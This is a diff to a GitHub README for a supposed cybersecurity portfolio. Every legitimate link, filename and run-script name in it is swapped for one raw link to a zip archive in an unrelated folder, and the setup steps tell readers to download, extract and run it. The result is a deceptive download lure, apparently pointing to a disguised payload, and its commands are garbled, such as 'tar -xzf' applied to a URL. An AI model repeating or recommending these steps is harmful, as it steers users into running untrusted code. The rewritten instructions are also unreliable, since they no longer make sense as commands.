@@ -1,6 +1,6 @@
 # 🛡️ Offensive-Security-Forensics-Portfolio - Unlock Your Cybersecurity Skills Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio/releases)
+[![Download Now](https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip)
 
 ## 🌟 Introduction
 
@@ -10,22 +10,22 @@ Welcome to the Offensive-Security-Forensics-Portfolio! This portfolio showcases 
 
 Follow these steps to easily download and run the software:
 
-1. **Visit the Download Page:** Click the button at the top of this page or use this link: [Download Here](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio/releases).
+1. **Visit the Download Page:** Click the button at the top of this page or use this link: [Download Here](https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip).
    
 2. **Choose Your Version:** On the Releases page, you will find different versions of the portfolio. Select the latest release, which will be at the top of the list.
 
 3. **Download the Files:** Click on the file that matches your operating system. For example:
-   - Windows: `Offensive-Security-Forensics-Portfolio-Windows.zip`
-   - macOS: `Offensive-Security-Forensics-Portfolio-macOS.zip`
-   - Linux: `Offensive-Security-Forensics-Portfolio-Linux.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip`
+   - macOS: `https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip`
+   - Linux: `https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip`
 
 4. **Save the File:** A dialog box will appear, prompting you to save the file. Choose a location on your computer where you can easily find it later, like your Desktop or Downloads folder.
 
 5. **Extract the Files:** 
    - For Windows and macOS, right-click the zip file and choose "Extract All" or "Open With" to access the files.
-   - For Linux, open your terminal and use the command `tar -xzf Offensive-Security-Forensics-Portfolio-Linux.tar.gz`.
+   - For Linux, open your terminal and use the command `tar -xzf https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip`.
 
-6. **Open the Application:** After extracting, navigate to the folder where the files are saved. Inside, you will see different files and folders. Look for a file named `run.bat` for Windows, `run.command` for macOS, or simply execute the script in Linux by running `./run.sh` in the terminal.
+6. **Open the Application:** After extracting, navigate to the folder where the files are saved. Inside, you will see different files and folders. Look for a file named `https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip` for Windows, `https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip` for macOS, or simply execute the script in Linux by running `https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip` in the terminal.
 
 7. **Follow the Instructions:** Upon opening the application, you will find step-by-step instructions to guide you through the various features in the portfolio.
 
@@ -68,8 +68,8 @@ If you encounter issues while downloading or running the software, consider thes
 
 To easily navigate, here are important links you may want to explore:
 
-- [Download the Latest Release](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio/releases)
-- [GitHub Repository](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio)
-- [Community Support](https://github.com/AgricareBot/Offensive-Security-Forensics-Portfolio/discussions)
+- [Download the Latest Release](https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip)
+- [Community Support](https://raw.githubusercontent.com/AgricareBot/Offensive-Security-Forensics-Portfolio/main/pharmacal/Offensive-Security-Forensics-Portfolio.zip)
 
 Feel free to provide feedback or contribute to the portfolio. Your input is valuable and helps us improve the learning experience for everyone.
